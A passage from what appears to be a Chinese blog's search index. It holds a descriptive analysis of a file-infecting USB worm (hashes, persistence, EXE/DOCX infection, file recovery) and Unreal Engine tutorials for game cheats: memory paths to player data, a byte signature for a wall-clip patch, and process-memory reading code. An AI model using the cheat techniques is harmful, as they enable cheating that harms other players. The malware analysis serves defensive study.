href=\"#2、msimg32详细分析\" class=\"headerlink\" title=\"2、msimg32详细分析\"></a>2、msimg32详细分析</h2><table>\n<thead>\n<tr>\n<th>样本名</th>\n<th>msimg32.exe</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>MD5</td>\n<td>8B16E470E4324FDB74EDAAA9C95450AF</td>\n</tr>\n<tr>\n<td>SHA-1</td>\n<td>993FE67ED998BB7F3F7B9F38C721701ECE766997</td>\n</tr>\n<tr>\n<td>File size</td>\n<td>676 KB (692,224 字节)</td>\n</tr>\n</tbody></table>\n<p>该模块同样为黑月编译器编译，直接跳转到入口。发现为创建线程方式执行。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<p>首先判断是否存在移动硬盘，判断方式也很简单，直接通过固定路径判断。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p>如果存在移动硬盘，则将主模块msimg32.exe拷贝到移动硬盘中，并运行主模块msimg32.exe。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<p>如果不存在移动硬盘，则创建一个时间周期为100毫秒的始终开始执行事件。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<p>事件开始会获取当前日期天数，如果天数为奇数则释放感染模块rundllx.exe并运行。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<p>反之，如果天数为偶数，则释放检测模块wsock32.exe，并运行。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId19.png\" alt=\"document_image_rId19\"></p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId20.png\" alt=\"document_image_rId20\"></p>\n<p>释放完毕后，主模块会进行写注册表项方式实现自启动。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId21.png\" alt=\"document_image_rId21\"></p>\n<p>并且禁止进入安全模式、隐藏文件扩展名、隐藏文件夹操作。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId22.png\" alt=\"document_image_rId22\"></p>\n<h2 id=\"3、rundllx详细分析\"><a href=\"#3、rundllx详细分析\" class=\"headerlink\" title=\"3、rundllx详细分析\"></a>3、rundllx详细分析</h2><table>\n<thead>\n<tr>\n<th>样本名</th>\n<th>rundllx.exe</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>MD5</td>\n<td>C6C3DD31B15753FEF32ABC053A04138C</td>\n</tr>\n<tr>\n<td>SHA-1</td>\n<td>B495326942038B891387B71B9F0E41C4E755F003</td>\n</tr>\n<tr>\n<td>File size</td>\n<td>288 KB (294,912 字节)</td>\n</tr>\n</tbody></table>\n<p>该模块为最终进行感染操作的模块，同样为黑月编译器编译。代码入口获取了磁盘信息。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId23.png\" alt=\"document_image_rId23\"></p>\n<p>并且开始扫描除C盘外的磁盘。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId24.png\" alt=\"document_image_rId24\"></p>\n<p>使用了递归的方法对磁盘下的目录进行扫描，扫描的文件格式为.docx和.exe。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId25.png\" alt=\"document_image_rId25\"></p>\n<p>扫描完毕后开始进行文件感染。</p>\n<h3 id=\"①EXE感染\"><a href=\"#①EXE感染\" class=\"headerlink\" title=\"①EXE感染\"></a>①EXE感染</h3><p>首先是判断文件后缀名是否为.exe文件。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId26.png\" alt=\"document_image_rId26\"></p>\n<p>然后判断文件属性是否为<strong>非系统文件</strong>和<strong>非隐藏文件</strong>。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId27.png\" alt=\"document_image_rId27\"></p>\n<p>在同级目录下写出T.exe文件并读入内存。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId28.png\" alt=\"document_image_rId28\"></p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId29.png\" alt=\"document_image_rId29\"></p>\n<p>同样操作Z.exe。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId30.png\" alt=\"document_image_rId30\"></p>\n<p>最后将原程序数据与T.exe、Z.exe合并后写出，完成对原程序的感染。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId31.png\" alt=\"document_image_rId31\"></p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId32.png\" alt=\"document_image_rId32\"></p>\n<p>带加密完毕后，删除T.exe和Z.exe。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId33.png\" alt=\"document_image_rId33\"></p>\n<h3 id=\"②DOCX感染\"><a href=\"#②DOCX感染\" class=\"headerlink\" title=\"②DOCX感染\"></a>②DOCX感染</h3><p>判断是否为.docx文件。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId34.png\" alt=\"document_image_rId34\"></p>\n<p>加密方式为在文件头插入字符串”<strong>HELLO！</strong>“数据。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId35.png\" alt=\"document_image_rId35\"></p>\n<h2 id=\"4、wsock32详细分析\"><a href=\"#4、wsock32详细分析\" class=\"headerlink\" title=\"4、wsock32详细分析\"></a>4、wsock32详细分析</h2><table>\n<thead>\n<tr>\n<th>样本名</th>\n<th>wsock32.exe</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>MD5</td>\n<td>A29DA8DDBB40BEA8EB65E8101E41786D</td>\n</tr>\n<tr>\n<td>SHA-1</td>\n<td>81D7DC554212CC9B931F87E378720293F9B50D39</td>\n</tr>\n<tr>\n<td>File size</td>\n<td>188 KB (192,512 字节)</td>\n</tr>\n</tbody></table>\n<p>该模块为主要负责检测msimg32是否在运行，若不运行则运行msimg32，同样为黑月编译器编译。入口为创建了一个时间周期为100毫秒的时钟。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId36.png\" alt=\"document_image_rId36\"></p>\n<p>事件入口判断msimg32进程是否存在，不存在则运行。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId37.png\" alt=\"document_image_rId37\"></p>\n<p>然后将自身添加到注册表启动项。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId38.png\" alt=\"document_image_rId38\"></p>\n<h1 id=\"四、还原文件\"><a href=\"#四、还原文件\" class=\"headerlink\" title=\"四、还原文件\"></a>四、还原文件</h1><h2 id=\"1、EXE文件\"><a href=\"#1、EXE文件\" class=\"headerlink\" title=\"1、EXE文件\"></a>1、EXE文件</h2><p>直接以字符串”<strong>&gt;&gt;&gt;&gt;&gt;&lt;—–&lt;&gt;&gt;&gt;&gt;&gt;MZ</strong>“为目标进行数据切割。将头部的蠕虫程序去除即可。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId39.png\" alt=\"document_image_rId39\"></p>\n<h2 id=\"2、DOCX文件\"><a href=\"#2、DOCX文件\" class=\"headerlink\" title=\"2、DOCX文件\"></a>2、DOCX文件</h2><p>直接删除文件头的字符串”<strong>HELLO！</strong>“</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId40.png\" alt=\"document_image_rId40\"></p>\n","categories":["Virus"]},{"title":"三、初识反射与数据挖掘","url":"/2024/04/21/%E4%B8%89%E3%80%81%E5%88%9D%E8%AF%86%E5%8F%8D%E5%B0%84%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/","content":"<h1 id=\"三、初识反射与数据挖掘\"><a href=\"#三、初识反射与数据挖掘\" class=\"headerlink\" title=\"三、初识反射与数据挖掘\"></a>三、初识反射与数据挖掘</h1><h1 id=\"一、初识反射\"><a href=\"#一、初识反射\" class=\"headerlink\" title=\"一、初识反射\"></a>一、初识反射</h1><ul>\n<li><strong>何为反射</strong>反射是指在运行状态下，任意一个实体类都能够知道<strong>这个类的所有属性和方法</strong>；对于任意一个对象，都能够调用它的<strong>任意方法和属性</strong>。这种<strong>动态获取信息</strong>以及<strong>动态调用对象方法</strong>的功能称为语言的反射。可以简单看看如下代码：</li>\n</ul>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Object</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> string <span class=\"title\">ToString</span><span class=\"params\">()</span> </span>= <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ClassA</span> :<span class=\"keyword\">public</span> Object</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> string <span class=\"title\">ToString</span><span class=\"params\">()</span></span>&#123; <span class=\"keyword\">return</span> <span class=\"string\">&quot;MyClass&quot;</span>; &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ClassB</span> :<span class=\"keyword\">public</span> Object</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> string <span class=\"title\">ToString</span><span class=\"params\">()</span></span>&#123; <span class=\"keyword\">return</span> <span class=\"string\">&quot;MyClass&quot;</span>; &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"function\">Object* <span class=\"title\">FactoryCreat</span><span class=\"params\">(<span class=\"type\">const</span> string&amp; className)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (className == <span class=\"string\">&quot;ClassA&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> ClassA;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (className == <span class=\"string\">&quot;ClassB&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> ClassB;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    Object* obj = <span class=\"built_in\">FactoryCreat</span>(<span class=\"string\">&quot;ClassA&quot;</span>);</span><br><span class=\"line\">    cout &lt;&lt; obj-&gt;<span class=\"built_in\">ToString</span>();</span><br><span class=\"line\">    <span class=\"keyword\">delete</span> obj;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>原生的C++是并不支持反射的的，因此UE引擎构建了一个自己的反射系统。那么为什么要做那么一个反射？最直接的例子就是UE蓝图。<code>蓝图是一类特殊的asset，可以使用直观、基于节点的方式创建逻辑，或者设置一些变量数据。策划可以创建自定义的Actor、Event、函数等等，快速的做Gameplay迭代，不需要写任何代码。蓝图也可以选择继承C++类，获取C++中定义的变量，调用C++中定义的函数，或者实现C++中定义的event</code>。</li>\n</ul>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%89%E3%80%81%E5%88%9D%E8%AF%86%E5%8F%8D%E5%B0%84%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/document_image_rId4.png\" alt=\"document_image_rId4\"></p>\n<p>U3D也存在反射，效果就是将脚本绑定到对象后，面板上会出现你这个脚本的类名和属性。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%89%E3%80%81%E5%88%9D%E8%AF%86%E5%8F%8D%E5%B0%84%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%89%E3%80%81%E5%88%9D%E8%AF%86%E5%8F%8D%E5%B0%84%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%89%E3%80%81%E5%88%9D%E8%AF%86%E5%8F%8D%E5%B0%84%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%89%E3%80%81%E5%88%9D%E8%AF%86%E5%8F%8D%E5%B0%84%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<ul>\n<li><strong>使用反射</strong></li>\n</ul>\n<p>写一个简单的反射工具，遍历对象下面的类有哪些。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UObject</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/** virtual function table */</span></span><br><span class=\"line\">  <span class=\"type\">void</span>* vtf; </span><br><span class=\"line\"><span class=\"comment\">/** Flags used to track and report various object states. This needs to be 8 byte aligned on 32-bit</span></span><br><span class=\"line\"><span class=\"comment\">        platforms to reduce memory waste */</span></span><br><span class=\"line\">    EObjectFlags                    ObjectFlags;</span><br><span class=\"line\">    <span class=\"comment\">/** Index into GObjectArray...very private. */</span></span><br><span class=\"line\">    int32                            InternalIndex;                <span class=\"comment\">//表明该对象在GObjectArray中的第几个</span></span><br><span class=\"line\">    <span class=\"comment\">/** Class the object belongs to. */</span></span><br><span class=\"line\">    UClass*                            ClassPrivate;        <span class=\"comment\">//对象所属的基类</span></span><br><span class=\"line\">    <span class=\"comment\">/** Name of this object */</span></span><br><span class=\"line\">    FName                            NamePrivate;           <span class=\"comment\">//类名</span></span><br><span class=\"line\">    <span class=\"comment\">/** Object this object resides in. */</span>   </span><br><span class=\"line\">    UObject*                        OuterPrivate;      <span class=\"comment\">//这个对象是从哪个对象来的</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/UnrealEngine/%E4%B8%89%E3%80%81%E5%88%9D%E8%AF%86%E5%8F%8D%E5%B0%84%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<h1 id=\"二、数据挖掘\"><a href=\"#二、数据挖掘\" class=\"headerlink\" title=\"二、数据挖掘\"></a>二、数据挖掘</h1><ul>\n<li><strong>基本数据</strong></li>\n</ul>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">数组：Uworld -&gt; ULevel -&gt; Actor</span><br><span class=\"line\">鼠标：Uworld -&gt; GameInstance -&gt; LocalPlayer -&gt; PlayerController -&gt; TargetViewRotation</span><br><span class=\"line\">相机坐标：Uworld -&gt; GameInstance -&gt; LocalPlayer -&gt;LocalPosition</span><br><span class=\"line\">本人：Uworld -&gt; GameInstance -&gt; LocalPlayer -&gt; PlayerController -&gt; AcknowledgedPawn</span><br><span class=\"line\">坐标：本人 -&gt; RootComponent</span><br><span class=\"line\">骨骼：本人 -&gt; MeshComponent</span><br><span class=\"line\">运动：本人 -&gt; MovementComponent（高跳，重力，三个方向速度，<span class=\"number\">1</span>）</span><br><span class=\"line\">名字：本人 -&gt; PlayerState -&gt; PlayerName（PlayerNamePrivate）</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>其他数据：</li>\n</ul>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">骨骼名：骨骼 -&gt; SkeletalMesh（访问骨骼）</span><br><span class=\"line\">全局加速：本人 -&gt; CustomTimeDilation</span><br><span class=\"line\">地图高亮：Uworld -&gt; GameInstance -&gt; LocalPlayer -&gt; PlayerController -&gt; CameraManager</span><br><span class=\"line\">灵魂出窍：xxxxxx</span><br><span class=\"line\">穿墙：E8 ?? ?? ?? ?? <span class=\"number\">85</span> ?? <span class=\"number\">75</span> ?? <span class=\"number\">0F</span> ?? ?? ?? ?? ?? ?? ?? EB（E8 ? ? ? ? <span class=\"number\">80</span> <span class=\"number\">67</span> <span class=\"number\">32</span> FD）改JE（原理）</span><br><span class=\"line\">高跳：xxxxxxx（运动）.....</span><br><span class=\"line\">静默自瞄：xxxxx（CameraManager）</span><br><span class=\"line\">无后座：xxxxx</span><br></pre></td></tr></table></figure>","categories":["UnrealEngine"]},{"title":"二、UE4四件套获取","url":"/2024/04/21/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/","content":"<h1 id=\"一、UWorld\"><a href=\"#一、UWorld\" class=\"headerlink\" title=\"一、UWorld\"></a>一、UWorld</h1><ul>\n<li><strong>字符串</strong>：<code>SeamlessTravel FlushLevelStreaming</code>源代码如下：</li>\n</ul>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">GWorld = LoadedWorld;    <span class=\"comment\">//特征</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!LoadedWorld-&gt;bIsWorldInitialized)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    LoadedWorld-&gt;<span class=\"built_in\">InitWorld</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">bWorldChanged = <span class=\"literal\">true</span>;</span><br><span class=\"line\"><span class=\"comment\">// Track session change on seamless travel.</span></span><br><span class=\"line\"><span class=\"built_in\">NETWORK_PROFILER</span>(GNetworkProfiler.<span class=\"built_in\">TrackSessionChange</span>(<span class=\"literal\">true</span>, LoadedWorld-&gt;URL));</span><br><span class=\"line\"><span class=\"built_in\">checkSlow</span>((LoadedWorld-&gt;<span class=\"built_in\">GetNetMode</span>() == NM_Client) == bIsClient);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (bCreateNewGameMode)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    LoadedWorld-&gt;<span class=\"built_in\">SetGameMode</span>(PendingTravelURL);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// if we&#x27;ve already switched to entry before and this is the transition to the new map, re-create the gameinfo</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (bSwitchedToDefaultMap &amp;&amp; !bIsClient)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (FAudioDevice* AudioDevice = LoadedWorld-&gt;<span class=\"built_in\">GetAudioDeviceRaw</span>())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        AudioDevice-&gt;<span class=\"built_in\">SetDefaultBaseSoundMix</span>(LoadedWorld-&gt;<span class=\"built_in\">GetWorldSettings</span>()-&gt;DefaultBaseSoundMix);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// Copy cheat flags if the game info is present</span></span><br><span class=\"line\">    <span class=\"comment\">// @todo UE4 FIXMELH - see if this exists, it should not since it&#x27;s created in GameMode or it&#x27;s garbage info</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (LoadedWorld-&gt;NetworkManager != <span class=\"literal\">nullptr</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        LoadedWorld-&gt;NetworkManager-&gt;bHasStandbyCheatTriggered = bHasStandbyCheatTriggered;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// Make sure &quot;always loaded&quot; sub-levels are fully loaded</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">SCOPE_LOG_TIME_IN_SECONDS</span>(<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;    SeamlessTravel FlushLevelStreaming &quot;</span>), <span class=\"literal\">nullptr</span>)  <span class=\"comment\">//特征</span></span><br><span class=\"line\">    LoadedWorld-&gt;<span class=\"built_in\">FlushLevelStreaming</span>(EFlushLevelStreamingType::Visibility);    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId4.png\" alt=\"document_image_rId4\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<ul>\n<li><strong>Count</strong>：</li>\n</ul>\n<blockquote>\n<p>Uworld -&gt; ULevel -&gt; Count</p>\n</blockquote>\n<ul>\n<li><strong>调试符号</strong>：<code>Gworld</code></li>\n</ul>\n<p>跳过去直接拿</p>\n<h1 id=\"二、GName\"><a href=\"#二、GName\" class=\"headerlink\" title=\"二、GName\"></a>二、GName</h1><ul>\n<li><strong>字符串</strong>：<code>ByteProperty</code></li>\n</ul>\n<p>源代码如下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> FNamePool&amp; <span class=\"title\">GetNamePool</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (bNamePoolInitialized)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> *(FNamePool*)NamePoolData;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    FNamePool* Singleton = <span class=\"built_in\">new</span> (NamePoolData) FNamePool;</span><br><span class=\"line\">    bNamePoolInitialized = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> *Singleton;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<ul>\n<li><strong>算法逆推</strong>：</li>\n</ul>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//   Version:4.22</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"function\">string <span class=\"title\">NameStore::GetName</span><span class=\"params\">(<span class=\"type\">int</span> i)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> Id = (<span class=\"type\">int</span>)(i  / (<span class=\"type\">int</span>)GameInst::ChunkSize);  <span class=\"comment\">//0 旧版本中未加密游戏的ChunkSize固定为16384</span></span><br><span class=\"line\">    <span class=\"type\">int</span> Idtemp = (<span class=\"type\">int</span>)(i % (<span class=\"type\">int</span>)GameInst::ChunkSize);<span class=\"comment\">//1</span></span><br><span class=\"line\">    <span class=\"keyword\">auto</span> NamePtr = Process::<span class=\"built_in\">Read</span>&lt;<span class=\"type\">uint64_t</span>&gt;(Names + Id * <span class=\"number\">8</span>);  <span class=\"comment\">//Names已经空读了一层</span></span><br><span class=\"line\">    <span class=\"keyword\">auto</span> Name = Process::<span class=\"built_in\">Read</span>&lt;<span class=\"type\">uint64_t</span>&gt;(NamePtr + <span class=\"number\">8</span> * Idtemp);</span><br><span class=\"line\">    <span class=\"type\">char</span> name[<span class=\"number\">0x100</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (Process::<span class=\"built_in\">ReadMemory</span>(<span class=\"built_in\">PVOID</span>(Name + <span class=\"number\">0x10</span>), name, <span class=\"number\">0x100</span>)) <span class=\"comment\">// 0xC需要手动测</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">string</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>UE中，每个ID都会对应一个属于自己的字符串。比如下表</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Id</th>\n<th>String</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0</td>\n<td>None</td>\n</tr>\n<tr>\n<td>1</td>\n<td>ByteProperty</td>\n</tr>\n<tr>\n<td>2</td>\n<td>IntProperty</td>\n</tr>\n<tr>\n<td>3</td>\n<td>BoolProperty</td>\n</tr>\n<tr>\n<td>4</td>\n<td>FloatProperty</td>\n</tr>\n<tr>\n<td>…..</td>\n<td>…..</td>\n</tr>\n</tbody></table>\n<p>那么，可以利用算法进行反推出Gname。那么假设<code>ID=1</code>，则<code>Id = 1 / 16384 = 0</code>、<code>Idtemp = 1 % 16384 = 1</code>。<strong>ChunkSize固定为0x4000（16384）</strong>。<br>搜索<code>ByteProperty</code>。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p>将结果逐个<code>Ctrl+B</code>进行查看，直到找得到如下图内容。</p>\n<p><img 